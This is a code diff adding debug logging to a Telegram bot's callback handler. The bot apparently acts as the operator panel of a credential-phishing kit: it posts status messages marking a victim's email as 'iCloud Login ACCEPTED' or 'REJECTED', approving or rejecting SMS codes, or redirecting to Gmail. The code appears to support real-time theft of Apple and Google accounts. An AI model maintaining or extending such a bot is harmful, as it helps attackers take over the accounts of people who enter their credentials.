@@ -94,14 +94,18 @@ bot.on("callback_query", async (query) => {
 
       // Send status reply
       let statusMessage = "";
+      console.log(`📋 Building status message for action: ${action}, email: ${email}`);
+      
       if (action === "page1") {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "page2") {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "accept") {
         statusMessage = `☁️ <code>${email}</code> iCloud Login <b>ACCEPTED</b>! ✅`;
+        console.log(`✅ ACCEPT matched! Message: ${statusMessage}`);
       } else if (action === "reject") {
         statusMessage = `☁️ <code>${email}</code> iCloud Login <b>REJECTED</b>! ❌`;
+        console.log(`❌ REJECT matched! Message: ${statusMessage}`);
       } else if (action === "sms_accept") {
         statusMessage = `📱 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
       } else if (action === "sms_reject") {
@@ -112,10 +116,13 @@ bot.on("callback_query", async (query) => {
         statusMessage = `🌈 <code>${email}</code> redirected to <b>Gmail</b>! ✅`;
       }
 
+      console.log(`📨 Final statusMessage: "${statusMessage}"`);
+
       // ✅ SEND THE MESSAGE
       if (statusMessage) {
         try {
           const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+          console.log(`🚀 Sending message to Telegram...`);
           await fetch(replyUrl, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -125,10 +132,12 @@ bot.on("callback_query", async (query) => {
               parse_mode: "HTML"
             })
           });
-          console.log(`✅ Sent message: ${statusMessage}`);
+          console.log(`✅ Message sent successfully!`);
         } catch (err) {
           console.error(`❌ Failed to send status message:`, err);
         }
+      } else {
+        console.log(`⚠️ statusMessage is empty, not sending`);
       }
     }
 
